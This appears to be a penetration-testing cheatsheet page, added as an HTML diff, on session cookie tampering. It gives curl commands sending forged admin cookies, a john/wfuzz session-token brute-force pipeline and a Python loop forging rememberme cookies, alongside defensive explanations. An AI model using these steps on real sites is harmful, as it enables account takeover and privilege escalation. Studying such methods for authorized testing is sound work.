@@ -1,0 +1,254 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cookie tampering · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Authentication &amp; Sessions</nav><h1>Cookie tampering</h1><p class="cx-lede">Decoding, modifying, and re-encoding session cookies - role escalation, rememberme abuse, and weak session-token brute-force.</p><div class="cx-tags"><span class="cx-tag">MITRE T1539, T1078</span><span class="cx-tag">D3FEND D3-MENCR, D3-CH</span><span class="cx-tag">IMPACT SessionTakeover, AuthBypass</span><span class="cx-tag">OWASP A07</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>When a session cookie contains identity, role, or grant data (instead of just a random session ID), tampering with it directly grants privileges or impersonates other users.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Decode the cookie
+Cookie: SESSIONID=757365723A626F623B726F6C653A75736572
+        ↓ hex decode
+        user:bob;role:user
+
+# Tamper
+        ↓ modify
+        user:bob;role:admin
+        ↓ re-encode (same format)
+        757365723A626F623B726F6C653A61646D696E
+
+# Send modified cookie
+Cookie: SESSIONID=757365723A626F623B726F6C653A61646D696E</code></pre></figure>
+<p>Success indicator: the application treats the request as having the modified identity/role - admin pages load, other users' data appears, restricted actions succeed.</p>
+<h2 id="why-this-exists">Why this exists</h2>
+<p>Pure random session IDs are the secure pattern. Many applications instead use session cookies that <em>contain</em> state - for "convenience" (no server-side session store needed), "speed" (no DB lookup per request), or because someone read about "stateless authentication" and didn't finish the article.</p>
+<p>When the application puts state in the cookie, it must:</p>
+<ol>
+<li>Encrypt the state (so the attacker can't read it)</li>
+<li>Sign the state (so the attacker can't modify it)</li>
+<li>Validate the signature on every request</li>
+</ol>
+<p>Skipping any of these creates the bug. Common failure modes:</p>
+<ul>
+<li><strong>State stored in plaintext</strong> (or simple encoding like base64/hex)</li>
+<li><strong>State signed but signature not verified</strong> on every request</li>
+<li><strong>State encrypted but encryption is reversible</strong> by an attacker who collects samples</li>
+</ul>
+<p>Distinct from random-session-ID-with-server-side-storage, where tampering is impossible because the attacker is just guessing IDs that don't exist.</p>
+<h2 id="step-1-identify-the-cookie">Step 1 - Identify the cookie</h2>
+<p>Log into your own account. Inspect the cookies set in the response:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -s -c - -X POST -d &quot;user=yourself&amp;pass=yourPass&quot; https://&lt;TARGET&gt;/login | grep -E &#x27;^[^#]&#x27; | column -t</code></pre></figure>
+<p>Common session-cookie names:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>SESSIONID, SESSION, PHPSESSID, JSESSIONID, ASP.NET_SessionId, connect.sid
+auth, token, session_token, sid
+APPSESS, custom prefixes per application
+rememberme, persistent, remember_token, _remember_user</code></pre></figure>
+<p>Cookies that <em>aren't</em> session-relevant (and shouldn't be your tampering target):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>_ga, _gid, _fbp, _utm*           ← analytics
+language, theme, currency        ← preferences
+cookie_consent, gdpr_accepted    ← consent banners
+csrftoken                        ← CSRF tokens (different attack class)</code></pre></figure>
+<p>The session cookies are usually obvious - they change between sessions, they're flagged <code>HttpOnly</code>, they have long values.</p>
+<h2 id="step-2-decode-the-cookie">Step 2 - Decode the cookie</h2>
+<p>Try every common encoding, in this order:</p>
+<h3 id="base64">Base64</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">echo -n &#x27;COOKIE_VALUE&#x27; | base64 -d</code></pre></figure>
+<p>Recognizable by: alphanumeric + <code>+/=</code> characters, length is a multiple of 4 (or close).</p>
+<h3 id="hex">Hex</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">echo -n &#x27;COOKIE_VALUE&#x27; | xxd -r -p</code></pre></figure>
+<p>Recognizable by: only <code>0-9a-f</code> (lowercase) or <code>0-9A-F</code> (uppercase), even length, no special characters.</p>
+<p>Example from a real-style application:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">echo -n &#x27;757365723A626F623B726F6C653A75736572&#x27; | xxd -r -p
+# → user:bob;role:user</code></pre></figure>
+<p>Reading the decoded value reveals the cookie's secret: it's a <code>key:value</code> structure containing user identity and role, encoded as hex.</p>
+<h3 id="url-encoding">URL-encoding</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">echo -n &#x27;COOKIE_VALUE&#x27; | python3 -c &quot;import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))&quot;</code></pre></figure>
+<p>Recognizable by: presence of <code>%XX</code> sequences.</p>
+<h3 id="json">JSON</h3>
+<p>If the decoded value starts with <code>{</code> or <code>[</code>, it's JSON. May contain identity directly:</p>
+<figure class="cx-code"><figcaption>json</figcaption><pre><code class="language-json">{&quot;user&quot;:&quot;bob&quot;,&quot;role&quot;:&quot;user&quot;,&quot;expires&quot;:1647135274}</code></pre></figure>
+<h3 id="jwt-three-base64-encoded-parts-separated-by-dots">JWT (three base64-encoded parts separated by dots)</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaHRiIiwicm9sZSI6InVzZXIifQ.signature</code></pre></figure>
+<p>JWT is its own attack class - see <a href="../jwt/index.html">JWT</a>.</p>
+<h3 id="compressed-chained-encodings">Compressed / chained encodings</h3>
+<p>Some applications chain multiple encodings: <code>base64(gzip(json(data)))</code>, or <code>hex(rot13(base64(...)))</code>, etc. Use CyberChef for unknown chains:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>https://gchq.github.io/CyberChef/</code></pre></figure>
+<p>Apply decoders one by one. Common chains:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>base64 → gzip → JSON
+base64 → hex → ASCII
+base64 → AES decrypt with known key → JSON</code></pre></figure>
+<h3 id="magic-bytes-for-binary-formats">Magic bytes for binary formats</h3>
+<p>If hex-decoded output looks like binary junk, check magic bytes:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>1F 8B           gzip
+42 5A           bzip2
+50 4B           ZIP
+89 50 4E 47     PNG</code></pre></figure>
+<p><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Wikipedia's file signatures</a> has the full list. CyberChef has a "Magic" operation that tries all common formats automatically.</p>
+<h3 id="decodify-automated-guessing">Decodify - automated guessing</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># https://github.com/s0md3v/Decodify
+decode &#x27;COOKIE_VALUE&#x27;</code></pre></figure>
+<p>Less thorough than CyberChef but useful for first-pass identification.</p>
+<h2 id="step-3-find-the-tamperable-field">Step 3 - Find the tamperable field</h2>
+<p>After decoding, look for fields that affect access:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>user, username, uid               ← identity
+role, group, permission           ← authorization
+is_admin, is_staff, admin         ← boolean grants
+level, tier, plan                 ← access tier</code></pre></figure>
+<p>Time-based fields might also be tamperable:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>expires, exp, expiry, valid_until      ← extend session lifetime</code></pre></figure>
+<p>Other fields are usually safe to ignore:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>csrf_token, nonce                 ← security tokens (signing-related)
+last_seen, ip                     ← tracking, not authorization
+preferences, locale               ← UI state</code></pre></figure>
+<h2 id="step-4-tamper-re-encode-send">Step 4 - Tamper, re-encode, send</h2>
+<p>Modify the relevant field, re-encode using the exact same chain in reverse:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Original: user:bob;role:user → 757365723A626F623B726F6C653A75736572
+# Modified: user:bob;role:admin
+echo -n &#x27;user:bob;role:admin&#x27; | xxd -p | tr -d &#x27;\n&#x27;
+# → 757365723A626F623B726F6C653A61646D696E</code></pre></figure>
+<p>Send the modified cookie:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -s -b &#x27;SESSIONID=757365723A626F623B726F6C653A61646D696E&#x27; https://&lt;TARGET&gt;/dashboard | grep -iE &#x27;admin|welcome&#x27;</code></pre></figure>
+<p>If the response shows admin functionality, the tamper worked. If the response is a login redirect or "session invalid" error, the cookie has a signature you broke (move to the encrypted/signed section below).</p>
+<h2 id="field-tampering-what-to-try">Field tampering - what to try</h2>
+<table>
+<thead>
+<tr>
+<th>Tamper</th>
+<th>What you're trying to achieve</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>role:user</code> → <code>role:admin</code></td>
+<td>Privilege escalation within your session</td>
+</tr>
+<tr>
+<td><code>user:bob</code> → <code>user:admin</code></td>
+<td>Impersonate another user</td>
+</tr>
+<tr>
+<td><code>is_admin:0</code> → <code>is_admin:1</code></td>
+<td>Toggle a boolean grant</td>
+</tr>
+<tr>
+<td><code>tier:free</code> → <code>tier:premium</code></td>
+<td>Access paid features</td>
+</tr>
+<tr>
+<td><code>expires:&lt;past&gt;</code> → <code>expires:&lt;future&gt;</code></td>
+<td>Extend session lifetime</td>
+</tr>
+<tr>
+<td><code>group:guests</code> → <code>group:administrators</code></td>
+<td>Group membership change</td>
+</tr>
+<tr>
+<td><code>permissions:read</code> → <code>permissions:read,write</code></td>
+<td>Add capabilities</td>
+</tr>
+</tbody>
+</table>
+<p>Test one field at a time - if multiple changes don't work but one does, you'll have to backtrack to find which one was correct.</p>
+<h3 id="field-name-variants">Field-name variants</h3>
+<p>The same logical concept might use different field names - try the variants:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>role | roles | usertype | account_type | privilege_level
+admin | administrator | superuser | super | root</code></pre></figure>
+<p>Some apps store role as numeric:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>0 | 1 | 2 | 9 | 99 | 999          # admin level often 0 or the highest</code></pre></figure>
+<p>Try integer escalation: if your current role is <code>5</code>, try <code>0</code>, <code>1</code>, <code>100</code>, <code>9999</code>.</p>
+<h2 id="rememberme-tokens">Rememberme tokens</h2>
+<p>Rememberme cookies are session cookies with a longer lifetime. The longer lifetime makes them attractive brute-force targets:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>APPPERSIST cookie set when &quot;remember me&quot; checkbox ticked at login
+Cookie persists for 7 / 30 / 90 days
+Same tampering analysis applies</code></pre></figure>
+<p>If the rememberme cookie contains the same encoded format as the session cookie, both are vulnerable to the same tampering attack. Sometimes they have <em>different</em> formats - check both.</p>
+<p>The rememberme cookie is also a good brute-force target separately - the cookie space is the same as the session space, but the attacker has more time to brute-force before the cookie expires.</p>
+<h2 id="encrypted-or-signed-cookies">Encrypted or signed cookies</h2>
+<p>When the cookie is encrypted/signed, simple tampering fails - the application detects the modification and rejects the session.</p>
+<h3 id="ecb-cipher-quirks">ECB cipher quirks</h3>
+<p>When the cookie is encrypted with ECB mode (no IV, deterministic block-by-block), patterns leak. Identical plaintext blocks produce identical ciphertext blocks. You can:</p>
+<ol>
+<li>Get a session for a user named <code>aaaaaaaa</code> (8 chars = one AES block of <code>a</code>)</li>
+<li>Get a session for a user named <code>aaaaaaaaadmin</code> </li>
+<li>Identify the block that encodes <code>aaaaaaaa</code> and the block that encodes <code>admin...</code></li>
+<li>Use these as building blocks to construct a cookie for any username</li>
+</ol>
+<p>Detection: get session cookies for several similar-but-different usernames and look at the binary diff. ECB will show stable blocks at stable positions.</p>
+<h3 id="cbc-padding-oracle-attacks">CBC padding-oracle attacks</h3>
+<p>When the cookie is encrypted with CBC and the application returns <em>different errors</em> for "padding invalid" vs. "decryption succeeded but contents are wrong," you can decrypt or forge cookies one byte at a time without knowing the key.</p>
+<p>This is the <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">padding oracle attack</a>. Tooling exists (<a href="https://github.com/AonCyberLabs/PadBuster">padbuster</a>) but the attack is slow and noisy - practical when other paths fail.</p>
+<h3 id="sign-then-encrypt-vs-encrypt-then-sign">Sign-then-encrypt vs. encrypt-then-sign</h3>
+<p>Different orderings have different weaknesses:</p>
+<ul>
+<li><strong>Sign then encrypt</strong> - vulnerable to ciphertext truncation in some cases</li>
+<li><strong>Encrypt then sign (correct)</strong> - vulnerable only if the signature is verified after decryption</li>
+</ul>
+<p>The application's framework usually picks one. Older frameworks (pre-2015) frequently used the wrong ordering.</p>
+<h2 id="weak-session-token-brute-force">Weak session-token brute-force</h2>
+<p>When the session cookie is a "random" value that's too short to actually be random, you can brute-force it directly:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Observation: cookies are 6 lowercase + digit characters
+# Charset: 36, length: 6 → 36^6 ≈ 2.2 billion possibilities
+# At 1000 attempts/sec, ~25 days - feasible if cookie is long-lived
+
+# Use john to generate candidate cookies (faster than incrementing in shell)
+john --incremental=LowerNum --min-length=6 --max-length=6 --stdout \
+  | wfuzz -z stdin -b APPSESS=FUZZ --ss &quot;Welcome&quot; -u https://&lt;TARGET&gt;/profile.php</code></pre></figure>
+<p><code>--ss "Welcome"</code> filters for responses showing the authenticated landing page. Any hit is a valid session for an already-logged-in user.</p>
+<h3 id="birthday-paradox-concern">Birthday paradox concern</h3>
+<p>A small session space increases collision probability - if the application has thousands of concurrent users and a 6-char alphanumeric session space, by the birthday paradox the brute-force succeeds much faster than the naive math suggests.</p>
+<h3 id="defending-against-this">Defending against this</h3>
+<p>Modern frameworks use 128-bit or 256-bit random session IDs. A 128-bit ID has 2^128 possibilities - infeasible to brute-force at any rate. Anything shorter is suspect.</p>
+<h2 id="custom-encoding-example">Custom encoding example</h2>
+<p>A worked example of a non-obvious chain. Suppose the application stores cookies as:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>hex(rot13(base64(user_name:persistentcookie:random_5digit)))</code></pre></figure>
+<p>Cookie value: some hex string.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Decode step by step
+echo -n &#x27;HEX_VALUE&#x27; | xxd -r -p &gt; /tmp/step1            # hex → bytes
+cat /tmp/step1 | tr &#x27;A-Za-z&#x27; &#x27;N-ZA-Mn-za-m&#x27; &gt; /tmp/step2  # ROT13
+cat /tmp/step2 | base64 -d                              # base64 → final</code></pre></figure>
+<p>Without source, you find this by:</p>
+<ol>
+<li>Observing the cookie is hex (only <code>0-9a-f</code>)</li>
+<li>After hex-decoding, the result looks like printable text - try ROT13 (uncommon but worth a guess when text looks "shifted")</li>
+<li>After ROT13, the result is base64-shaped → decode to final</li>
+</ol>
+<p>Automation for brute-forcing in such cases:</p>
+<figure class="cx-code"><figcaption>python</figcaption><pre><code class="language-python">import base64
+import codecs
+import requests
+
+def encode_cookie(username, persistence, random5):
+    plain = f&quot;{username}:{persistence}:{random5:05d}&quot;
+    b64 = base64.b64encode(plain.encode()).decode()
+    rot = codecs.encode(b64, &#x27;rot_13&#x27;)
+    hex_form = rot.encode().hex()
+    return hex_form
+
+# Brute-force the random5 value for a known username
+for random5 in range(100000):
+    cookie = encode_cookie(&#x27;siteadmin&#x27;, &#x27;persistentcookie&#x27;, random5)
+    res = requests.get(URL, cookies={&#x27;APPPERSIST&#x27;: cookie})
+    if &#x27;Welcome&#x27; in res.text:
+        print(f&quot;Hit at random5={random5}: {cookie}&quot;)
+        break</code></pre></figure>
+<h2 id="detection-only-checks">Detection-only checks</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Compare your cookie to another user&#x27;s cookie (e.g., create two test accounts)
+# Look at which bytes differ - those bytes encode user-specific data
+
+# Set a known-bad cookie and observe the application&#x27;s reaction
+curl -s -b &#x27;SESSIONID=AAAAAAAAAAAAAAAAAAAA&#x27; https://&lt;TARGET&gt;/dashboard
+# - 200 OK with login form → cookie rejected, redirect to login
+# - 200 OK with dashboard content → app accepts any cookie (extremely broken)
+# - 500 / weird error → cookie validation crashes (bug, possibly exploitable further)</code></pre></figure>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>The cleanest indicator that tampering is possible:</strong> decoded cookie contents include human-readable identity strings. If you can read your username and role in plaintext after a quick decode, the application isn't signing or encrypting.</li>
+<li><strong>Cookie attributes matter for stealing, not tampering.</strong> <code>HttpOnly</code> prevents JavaScript access (XSS defense); <code>Secure</code> requires HTTPS; <code>SameSite</code> limits cross-origin. None of these prevent the legitimate session-holder from inspecting and modifying their own cookie. Tampering is a self-attack.</li>
+<li><strong>Server-side validation is the only defense.</strong> When the app re-validates the user/role on every request against a server-side database, tampering fails - even with no signing, the modified value doesn't match anything in the DB. The bugs in this section all involve the app trusting the cookie's claimed identity <em>without</em> re-checking.</li>
+<li><strong>Once you have admin via tampering, check for an audit log of "role changed" events.</strong> Some apps log when a role differs from the last seen value; some don't. If they don't, this attack leaves no forensic trace.</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Successful cookie tampering = privilege escalation in a single request, which is often the most impactful finding in an engagement. Demonstrate at the minimum-disruption level (read admin page, screenshot, log out) and stop there for the report. Don't perform destructive admin actions during a pentest unless explicitly authorized.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../username-injection/index.html">Previous: Username injection</a><a class="cx-next" href="../session-fixation/index.html">Next: Session fixation &amp; token exposure</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
